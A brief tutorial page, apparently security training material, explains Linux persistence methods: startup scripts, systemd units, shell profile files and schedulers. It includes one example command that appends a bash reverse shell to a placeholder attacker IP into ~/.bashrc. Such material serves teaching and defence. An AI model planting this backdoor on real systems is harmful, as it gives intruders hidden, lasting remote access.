Linux Persistence: Startup Scripts & Services

Exploring alternative methods for maintaining access on Linux.

Leveraging System Startup for Control

Linux systems execute various scripts and services during boot-up. By injecting malicious code or creating new entries in these startup sequences, an attacker can ensure their payload runs automatically, providing persistent access even after reboots. This often requires elevated privileges but offers high reliability.

  • •High Reliability: Executes early in the boot process.
  • •Elevated Privileges: Often runs as root or system user.
  • •Stealth Potential: Can be disguised as legitimate system components.

Common Linux Persistence Vectors

/etc/init.d/ & rc.local

Traditional startup scripts executed during boot.

systemd Services

Creating custom service unit files for modern Linux systems.

.bashrc / .profile

User-specific scripts executed upon login for interactive shells.

Scheduled Tasks

Beyond crontab, other task schedulers can be abused.

Example: .bashrc Persistence

Adding echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> ~/.bashrc will execute a reverse shell every time the user logs in.

Key Takeaway

Linux offers a rich array of persistence vectors beyond crontab, including startup scripts, systemd services, and user profile modifications, each with distinct characteristics for maintaining access.
